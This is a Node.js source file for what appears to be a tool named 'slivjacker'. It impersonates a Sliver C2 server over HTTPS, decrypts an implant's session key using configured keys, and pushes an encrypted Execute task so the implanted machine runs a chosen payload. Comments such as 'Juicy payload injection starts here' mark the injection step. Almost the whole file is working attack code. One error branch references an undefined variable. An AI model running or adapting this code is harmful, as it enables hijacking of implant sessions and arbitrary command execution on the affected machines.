'use strict';

const crypto = require('crypto');
const fs = require('fs');
const https = require('https');
const path = require('path');
const zlib = require('zlib');

const nacl = require('tweetnacl');
const protobuf = require('protobufjs');

const encoders = require('./encoders.js');

function getEncoder(params)
{
  let nonce = null;
  for(let entry of params)
  {
    if(entry[0].length === 1)
    {
      nonce = parseInt(entry[1].match(/[\d]+/g).join(''));
      break;
    }
  }

  if(!nonce)
  {
    return null;
  }

  return encoders[nonce % 101];
}

function intercept(conf, req, resp)
{
  if(!module.sessions)
  {
    module.sessions = new Map();
  }

  console.log('[%s] %s', req.method, req.url);
  console.log('Headers:', req.headers);

  let cache = [];

  req.on('data', (buf) => {
    cache.push(buf);
  });

  req.on('end', () => {
    let url = new URL(req.url, 'https://example.com');
    let encoder = getEncoder(url.searchParams);
    if(!encoder) // Oopsie. :c
    {
      console.error('No available decoder to decode this message! The raw data in hex is attached below.');
      console.warn(data.toString('hex'));
      console.warn();

      resp.writeHead(403, {
        'Content-Length': 0
      });
      resp.end();

      return;
    }

    if(req.method === 'POST')
    {
      let data = Buffer.concat(cache);
      let decoded = encoder.decode(data);
      if(url.pathname.endsWith('.html')) // Key exchange
      {
        let parsed = decryptSessionKey(conf, decoded);
        console.log('Decoded:', parsed);

        let iv = Buffer.allocUnsafe(12);
        crypto.randomFillSync(iv);

        let sessID = iv.toString('base64'); // Yeah I'm lazy.
        module.sessions.set(sessID, Buffer.from(parsed.sessionKey, 'hex')); // Cache the key
        console.log('New instance! SessID = %s', sessID);

        // I'm lazy to check how the Sliver server recognizes each session lol.
        module.defaultID = sessID;

        let cip = crypto.createCipheriv('chacha20-poly1305', module.sessions.get(sessID), iv, {
          authTagLength: 16
        });
        let raw = Buffer.concat([iv, cip.update(zlib.gzipSync(Buffer.from(sessID, 'ascii'))), cip.final(), cip.getAuthTag()]);

        let enc = encoder.encode(raw);
        resp.writeHead(200, {
          'Content-Length': `${enc.length}`
        });
        resp.end(enc);
      }
      else
      {
        // console.log('DecodedRaw: %s', decoded.toString('hex'));
        let iv = decoded.subarray(0, 12);
        let enc = decoded.subarray(12, decoded.length - 16);
        let at = decoded.subarray(decoded.length - 16);

        // Yeah. Here we just use `module.defaultID` cause I'm lazy.
        let dcp = crypto.createDecipheriv('chacha20-poly1305', module.sessions.get(module.defaultID), iv, {
          authTagLength: 16
        });
        dcp.setAuthTag(at);
        let dec = zlib.gunzipSync(Buffer.concat([dcp.update(enc), dcp.final()]));

        // console.log('DecodedRaw: %s', dec.toString('hex'));
        let bundle = decodeMessage(conf, dec);
        if(bundle)
        {
          console.log(bundle);
        }
        else
        {
          console.log('RawDataHex: %s', dec.toString('hex'));
        }

        // All other post requests are just pure uploads. We can simply ignore them.
        resp.writeHead(202, {
          'Content-Length': 0
        });
        resp.end();
      }
    }
    else
    {
      if(url.pathname.endsWith('.png')) // Close session
      {
        resp.writeHead(202, {
          'Content-Length': 0
        });
        resp.end();

        return;
      }

      // Juicy payload injection starts here. c:
      let spear = encodePayload(conf);
      if(!spear) // Encoding error
      {
        resp.writeHead(202, {
          'Content-Length': 0
        });
        resp.end();

        return;
      }

      let iv = Buffer.allocUnsafe(12);
      crypto.randomFillSync(iv);

      // Yeah. Here we just use `module.defaultID` cause I'm lazy.
      let cip = crypto.createCipheriv('chacha20-poly1305', module.sessions.get(module.defaultID), iv, {
        authTagLength: 16
      });

      let raw = Buffer.concat([iv, cip.update(zlib.gzipSync(spear)), cip.final(), cip.getAuthTag()]);

      let enc = encoder.encode(raw);
      console.log(`## Sending payload to launch ${path.basename(conf.payload.Path)} ^.^ ##`);
      resp.writeHead(200, {
        'Content-Length': `${enc.length}`
      });
      resp.end(enc);
      console.log('## The payload has been dispatched! Check your implanted VM! ##');
    }

    console.log();
  });
}

// Decrypts the session key
function decryptSessionKey(conf, buf)
{
  const privKey = Buffer.from(conf.implantPriv, 'base64');
  const pubKey = Buffer.from(conf.serverPub, 'base64');

  let hash = buf.subarray(0, 32);
  let nonce = buf.subarray(32, 56);
  let enc = buf.subarray(56);

  let dec = nacl.box.open(enc, nonce, pubKey, privKey);

  let des = conf.pbRoot.lookupType('HTTPSessionInit').decode(dec);
  return {
    hash: hash.toString('hex'),
    nonce: nonce.toString('hex'),
    sessionKey: Buffer.from(des.Key).toString('hex')
  };
}

// Decode session POST messages
//  This isn't actually required to trigger the payload. But we just parse it anyway.
function decodeMessage(conf, buf)
{
  let rawBundle = conf.pbRoot.lookupType('Envelope').decode(buf);
  let ret = null;
  switch(rawBundle.Type)
  {
    case 93: // BeaconRegister
    {
      ret = conf.pbRoot.lookupType('BeaconRegister').decode(buf);
      break;
    }
    case 94: // BeaconTasks report
    {
      ret = conf.pbRoot.lookupType('BeaconTasksJS').decode(buf);
      break;
    }
    default:
    {
      // Do nothing for now
    }
  }

  return ret;
}

function encodePayload(conf)
{
  try
  {
    let execReq = conf.pbRoot.lookupType('ExecuteReq');
    let dat0 = execReq.encode(conf.payload).finish();
    // console.log(dat0);
  
    let beaconTasks = conf.pbRoot.lookupType('BeaconTasks');
    let dat1 = beaconTasks.encode({
      ID: 'slivjacker', // Whatever random stuff
      Tasks: [{
        ID: 0x78563412, // Whatever random stuff again
        Type: 44, // taskTypes.Execute
        Data: dat0
      }]
    }).finish();
    // console.log(dat1);
  
    let envelope = conf.pbRoot.lookupType('Envelope');
    let dat2 = envelope.encode({
      ID: 0x21436587, // Again what it is doesn't matter here
      Data: dat1
    }).finish();
    // console.log(dat2);
  
    return dat2;
  }
  catch(err)
  {
    console.error('Unable to load the Sliver protobuf config!');
    console.error(err);

    return null;
  }
}

function __main__()
{
  let conf = JSON.parse(fs.readFileSync(`${__dirname}/../conf.json`));

  protobuf.load(`${__dirname}/../data/protobuf/sliver.proto`, function(err0, pbRoot) {
    if(err0)
    {
      console.error('Unable to load the Sliver protobuf config!');
      console.error(err0);
      return;
    }

    conf.pbRoot = pbRoot;

    let cert = fs.readFileSync(path.isAbsolute(conf.cert) ? conf.cert : `${__dirname}/../${conf.cert}`);
    let key = fs.readFileSync(path.isAbsolute(conf.key) ? conf.key : `${__dirname}/../${conf.key}`);
  
    https.createServer({
      cert: cert,
      key: key
    }, (req, resp) => {
      intercept(conf, req, resp);
    }).listen(conf.port);
  });
}

if(require.main === module)
{
  __main__();
}
